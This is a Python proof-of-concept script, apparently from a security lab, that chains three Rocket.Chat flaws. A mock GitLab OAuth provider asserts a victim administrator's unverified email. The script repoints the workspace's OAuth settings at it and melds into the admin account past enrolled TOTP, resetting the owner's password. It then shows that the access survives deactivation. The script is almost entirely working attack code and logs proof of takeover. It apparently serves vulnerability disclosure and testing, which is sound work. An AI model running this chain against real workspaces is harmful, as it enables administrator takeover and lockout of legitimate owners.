ADMIN_USER = os.environ.get("ADMIN_USER", "admin")                 # manifest admin: provisioning only
ADMIN_PASS = os.environ.get("ADMIN_PASS", "Bspdr-Lab-Adm1n!")      # manifest admin password
IDP_PORT = int(os.environ.get("CHAIN_IDP_PORT", "8800"))           # the stand-in provider's port


def api(sess, method, path, **kw):
    return sess.request(method, f"{BASE_URL}{path}", timeout=60, **kw)


def login(username, password):
    s = requests.Session()
    r = api(s, "POST", "/api/v1/login", json={"user": username, "password": password})
    d = r.json()
    if d.get("status") != "success":
        raise RuntimeError(f"login {username} failed: {r.status_code} {r.text[:200]}")
    s.headers.update({"X-Auth-Token": d["data"]["authToken"], "X-User-Id": d["data"]["userId"]})
    return s


def sess_for(token, uid):
    s = requests.Session()
    s.headers.update({"X-Auth-Token": token, "X-User-Id": uid})
    return s


def mkuser(adm, name, pw, roles=("user",)):
    r = api(adm, "POST", "/api/v1/users.create", json={
        "username": name, "name": name, "email": f"{name}@lab.invalid", "password": pw,
        "roles": list(roles), "joinDefaultChannels": False, "verified": False,
        "requirePasswordChange": False})
    if not r.json().get("success"):
        raise RuntimeError(f"could not create {name}: {r.text[:200]}")
    return r.json()["user"]["_id"]


def rmuser(adm, uid):
    api(adm, "POST", "/api/v1/users.delete", json={"userId": uid, "confirmRelinquish": True})


def banner(title):
    print("=" * 72)
    print(f"{VULN}: {title}")
    print(f"target : {BASE_URL}")
    print("author : Blue Spider")
    print("=" * 72)


def get_setting(adm, sid):
    r = api(adm, "GET", f"/api/v1/settings/{sid}")
    return r.json().get("value") if r.status_code == 200 else None


def set_setting(adm, sid, value):
    import hashlib
    api(adm, "POST", f"/api/v1/settings/{sid}", json={"value": value},
        headers={"x-2fa-method": "password",
                 "x-2fa-code": hashlib.sha256(ADMIN_PASS.encode()).hexdigest()})


class MockGitLab:
    """A GitLab-compatible OAuth2 identity provider, in-process and inline.

    Rocket.Chat's built-in GitLab backend takes its base URL from the
    API_Gitlab_URL setting, so pointing it here needs no source change. Three
    endpoints are all the Passport strategy uses:
      GET  /oauth/authorize  -> redirect back to the workspace with code+state
      POST /oauth/token      -> an access token
      GET  /api/v4/user      -> the identity, including the email claim this
                                provider lets its own users type in
    `identity` is what the IdP asserts; this chain asserts the victim
    administrator's address. Every request is recorded in `hits`.
    """

    def __init__(self, port=8800, callback=None, identity=None):
        import http.server
        import socket
        import threading as _th
        self.port = port
        self.callback = callback or f"{BASE_URL}/_oauth/gitlab"
        self.identity = identity or {}
        self.hits = []
        idp = self

        class H(http.server.BaseHTTPRequestHandler):
            def _send(self, code, body=b"", ctype="application/json", headers=()):
                self.send_response(code)
                self.send_header("content-type", ctype)
                for k, v in headers:
                    self.send_header(k, v)
                self.send_header("content-length", str(len(body)))
                self.end_headers()
                if body:
                    self.wfile.write(body)

            def do_GET(self):
                u = _up.urlparse(self.path)
                q = dict(_up.parse_qsl(u.query))
                idp.hits.append({"method": "GET", "path": self.path})
                if u.path == "/oauth/authorize":
                    # consent granted at once: straight back to the workspace
                    loc = (idp.callback + "?code=mock-" + secrets.token_hex(6) +
                           "&state=" + _up.quote(q.get("state", "")))
                    self._send(302, b"", "text/html", (("location", loc),))
                elif u.path == "/api/v4/user":
                    self._send(200, json.dumps(idp.identity).encode())
                else:
                    self._send(404, b"{}")

            def do_POST(self):
                n = int(self.headers.get("content-length") or 0)
                body = self.rfile.read(n).decode("utf-8", "replace")
                idp.hits.append({"method": "POST", "path": self.path, "body": body})
                if self.path.startswith("/oauth/token"):
                    self._send(200, json.dumps({"access_token": "mock-" + secrets.token_hex(8),
                                                "token_type": "bearer",
                                                "expires_in": 7200}).encode())
                else:
                    self._send(404, b"{}")

            def log_message(self, *a):
                pass

        self.srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), H)
        _th.Thread(target=self.srv.serve_forever, daemon=True).start()
        # The app has to resolve this container by name on the lab network.
        # $BLUESPIDER_ATTACKER is the container's name on the host; inside the
        # container the hostname (its short id) resolves just as well, so either
        # works. ATTACKER_HOST overrides both.
        me = (os.environ.get("ATTACKER_HOST") or os.environ.get("BLUESPIDER_ATTACKER")
              or socket.gethostname())
        self.base = f"http://{me}:{port}"

    def enable(self, adm, client_id=None, secret=None):
        """Point the workspace's GitLab provider at this stand-in. Returns the
        previous values so the run can restore them."""
        old = {k: get_setting(adm, k) for k in
               ("Accounts_OAuth_Gitlab", "Accounts_OAuth_Gitlab_id",
                "Accounts_OAuth_Gitlab_secret", "API_Gitlab_URL")}
        set_setting(adm, "API_Gitlab_URL", self.base)
        set_setting(adm, "Accounts_OAuth_Gitlab_id", client_id or "mock-client")
        set_setting(adm, "Accounts_OAuth_Gitlab_secret", secret or "mock-secret")
        set_setting(adm, "Accounts_OAuth_Gitlab", True)
        time.sleep(3)                      # the provider is reconfigured on a debounce
        return old

    @staticmethod
    def restore(adm, old):
        set_setting(adm, "Accounts_OAuth_Gitlab", False)
        for k, v in old.items():
            if k != "Accounts_OAuth_Gitlab":
                set_setting(adm, k, v if v is not None else "")

    def login(self):
        """Walk the whole redirect chain as a browser would, and return the final
        URL plus the response (the login code lands in that URL).

        One lab detail, not part of the bug: the OAuth session cookie is issued
        `Secure` on a production build (configurePassport.ts:45-50), and
        express-session refuses to set it on a connection it does not consider
        secure. The vendor's deployment guide puts the workspace behind HTTPS, so
        a browser there gets the cookie; this lab terminates plain HTTP, so the
        request is sent to the app with `X-Forwarded-Proto: https` (the app is
        configured with `trust proxy`) and the cookie is carried by hand, which
        is what a browser on the documented deployment does for itself. The
        server-side code path is identical either way.
        """
        app = os.environ.get("LAB_APP_DIRECT", "http://rocketchat:3000").rstrip("/")
        hdr = {"X-Forwarded-Proto": "https"}
        s = requests.Session()
        jar = {}

        def hop(url):
            for pre in (BASE_URL, app):
                if url.startswith(pre):
                    url = app + url[len(pre):]
            h = dict(hdr)
            if jar:
                h["Cookie"] = "; ".join(f"{k}={v}" for k, v in jar.items())
            r = s.get(url, allow_redirects=False, timeout=60, headers=h)
            for c in r.raw.headers.get_all("set-cookie") or []:
                k, _, v = c.split(";")[0].partition("=")
                jar[k.strip()] = v.strip()
            return r

        last_url = f"{app}/oauth/gitlab"
        r = hop(last_url)
        for _ in range(6):
            loc = r.headers.get("location")
            if not loc:
                break
            if loc.startswith("/"):
                loc = app + loc
            last_url = loc
            r = hop(loc)
        return last_url, r

    def stop(self):
        try:
            self.srv.shutdown()
        except Exception:
            pass


def code_from(url):
    return dict(_up.parse_qsl(_up.urlparse(url).query)).get("loginCode")


def redeem(code):
    """Exchange the login code the callback put in the URL for a session. The
    route answers {loginToken, userId} (loginCode.ts:58-61)."""
    r = requests.post(f"{BASE_URL}/api/v1/loginCode.redeem", json={"code": code}, timeout=60)
    d = r.json()
    return {"authToken": d.get("loginToken") or (d.get("data") or {}).get("authToken"),
            "userId": d.get("userId") or (d.get("data") or {}).get("userId"),
            "raw": d}


def main():
    sfx = rand()
    banner("an IdP account becomes an administrator, past TOTP, and survives deactivation")
    log("INFO", "chaining VULN-002 (the meld trusts the asserted address) -> VULN-043 (the OAuth "
                "path skips an enrolled second factor inside the grace window) -> VULN-030 (the "
                "login-code path ignores the account's active flag)")
    adm = login(ADMIN_USER, ADMIN_PASS)
    ev = {}

    # [SETUP] the victim: an extra administrator who enrolled TOTP. The
    # workspace's own admin account is deliberately not the target, because the
    # meld resets the melded account's password.
    vic = f"vicadm_{sfx}"
    vic_addr = f"{vic}@lab.invalid"
    vpw = f"Lab-Adm-{sfx}!A9"
    vic_uid = mkuser(adm, vic, vpw, roles=("user", "admin"))
    sv = login(vic, vpw)
    seed = api(sv, "POST", "/api/v1/users.enableTotp", json={}).json().get("secret")
    api(sv, "POST", "/api/v1/users.validateTotp", json={"code": pyotp.TOTP(seed).now()})
    gate = requests.post(f"{BASE_URL}/api/v1/login", json={"user": vic, "password": vpw}, timeout=30)
    remember = get_setting(adm, "Accounts_TwoFactorAuthentication_RememberFor")
    log("SETUP", f"victim administrator {vic} <{vic_addr}> with TOTP enrolled: its own password "
                 f"login answers HTTP {gate.status_code} {gate.json().get('error')}; the grace "
                 f"window Accounts_TwoFactorAuthentication_RememberFor is {remember}")
    ev["setup"] = {"victim": vic, "password_login_gated": gate.json(), "grace_window": remember}

    idp = MockGitLab(IDP_PORT, identity={"id": 90000 + secrets.randbelow(9000),
                                         "username": f"outsider-{sfx}", "name": "Outsider",
                                         "email": vic_addr})
    old = idp.enable(adm)
    log("SETUP", f"the workspace's GitLab provider now points at the stand-in {idp.base}, which "
                 f"asserts {vic_addr} without claiming to have verified it")
    took = {}
    try:
        # ------------------------------------------------------------ steps 1+2
        # VULN-002 and VULN-043: the asserted address is the whole credential,
        # and no code is demanded although the account has TOTP enrolled.
        log("STEP", "1/3 VULN-002 + 2/3 VULN-043: drive /oauth/gitlab as the outsider")
        url, resp = idp.login()
        code = code_from(url)
        save("request.http", f"GET /oauth/gitlab HTTP/1.1\r\nHost: {BASE_URL.split('//', 1)[1]}\r\n\r\n"
                             f"(the stand-in IdP asserted: {json.dumps(idp.identity)})\n\n"
                             f"POST /api/v1/loginCode.redeem HTTP/1.1\r\n"
                             f"Content-Type: application/json\r\n\r\n"
                             f"{json.dumps({'code': code})}")
        save("response.txt", f"final URL: {url}\nHTTP {resp.status_code}\n\n{resp.text[:800]}")
        log("PROOF" if code and "/2fa/" not in url else "FAIL",
            f"    the callback ended at {url.split('?')[0]} with loginCode="
            f"{str(code)[:12]}... (a second-factor challenge would have been /2fa/totp/<id>)")
        if code:
            took = redeem(code)
        sa = sess_for(took.get("authToken") or "", took.get("userId") or "")
        me = api(sa, "GET", "/api/v1/me")
        priv = api(sa, "GET", "/api/v1/rooms.adminRooms?count=1")
        log("PROOF" if priv.status_code == 200 else "FAIL",
            f"    the redeemed session is {me.json().get('username')} with roles "
            f"{me.json().get('roles')}, and it reaches an administrator-only route: "
            f"rooms.adminRooms HTTP {priv.status_code}")
        owner = requests.post(f"{BASE_URL}/api/v1/login", json={"user": vic, "password": vpw},
                              timeout=30)
        log("PROOF", f"    meanwhile the real owner's own password answers HTTP "
                     f"{owner.status_code} {owner.json().get('error')}: the meld reset it, so the "
                     f"takeover locks the owner out too")
        ev["step12_takeover"] = {"final_url": url.split("?")[0], "login_code": bool(code),
                                 "second_factor_demanded": "/2fa/" in url,
                                 "username": me.json().get("username"),
                                 "roles": me.json().get("roles"),
                                 "admin_route": priv.status_code,
                                 "owner_password_after": owner.json()}

        # ------------------------------------------------------------- step 3
        # The operator's response, and VULN-030. Deactivation deletes every
        # token, which is why it is the documented answer to a compromise.
        log("STEP", "3/3 VULN-030: the operator deactivates the compromised administrator, then the "
                    "outsider signs in again")
        api(adm, "POST", "/api/v1/users.setActiveStatus",
            json={"userId": vic_uid, "activeStatus": False})
        time.sleep(1)
        killed = api(sa, "GET", "/api/v1/me")
        pw_after = requests.post(f"{BASE_URL}/api/v1/login",
                                 json={"user": vic, "password": vpw}, timeout=30)
        log("INFO", f"    deactivation did what it promises for the stolen token (/api/v1/me -> "
                    f"HTTP {killed.status_code}) and for the password path (HTTP "
                    f"{pw_after.status_code} {pw_after.json().get('error')})")
        url2, _ = idp.login()
        code2 = code_from(url2)
        took2 = redeem(code2) if code2 else {}
        sa2 = sess_for(took2.get("authToken") or "", took2.get("userId") or "")
        me2 = api(sa2, "GET", "/api/v1/me")
        priv2 = api(sa2, "GET", "/api/v1/rooms.adminRooms?count=1")
        still_admin = priv2.status_code == 200
        log("PROOF" if still_admin else "FAIL",
            f"    signing in again through the same provider returned a working token: "
            f"/api/v1/me HTTP {me2.status_code} username={me2.json().get('username')} "
            f"active={me2.json().get('active')}, and rooms.adminRooms HTTP {priv2.status_code}: "
            f"the deactivated administrator's rights are back in the attacker's hands")
        ev["step3_survives_deactivation"] = {
            "stolen_token_after_deactivation": killed.status_code,
            "password_path_after_deactivation": pw_after.json(),
            "second_login_code": bool(code2),
            "me": {"status": me2.status_code, "username": me2.json().get("username"),
                   "active": me2.json().get("active"), "roles": me2.json().get("roles")},
            "admin_route": priv2.status_code}
        save("evidence/chain-005.json", json.dumps(ev, indent=2, default=str))
        save("evidence/idp-requests.json", json.dumps(idp.hits, indent=2))
    finally:
        log("INFO", "cleanup: restoring the provider settings and deleting the administrator this "
                    "run created")
        MockGitLab.restore(adm, old)
        idp.stop()
        rmuser(adm, vic_uid)
        log("INFO", f"    provider off: Accounts_OAuth_Gitlab="
                    f"{get_setting(adm, 'Accounts_OAuth_Gitlab')}, API_Gitlab_URL="
                    f"{get_setting(adm, 'API_Gitlab_URL')!r}")

    ok = (ev.get("step12_takeover", {}).get("admin_route") == 200
          and not ev["step12_takeover"]["second_factor_demanded"]
          and ev.get("step3_survives_deactivation", {}).get("admin_route") == 200
          and ev["step3_survives_deactivation"]["me"].get("active") is False)
    if ok:
        return verdict("CONFIRMED",
                       "an identity provider asserting an administrator's unverified address "
                       "produced a full administrator session with no second factor although the "
                       "account had TOTP enrolled, reset that administrator's password, and after "
                       "the operator deactivated the account the same provider handed out another "
                       "working token that still reached administrator-only routes")
    return verdict("FAILED",
                   f"takeover={ev.get('step12_takeover', {}).get('admin_route')} "
                   f"2fa_demanded={ev.get('step12_takeover', {}).get('second_factor_demanded')} "
                   f"after_deactivation={ev.get('step3_survives_deactivation', {}).get('admin_route')}")


if __name__ == "__main__":
    sys.exit(main())
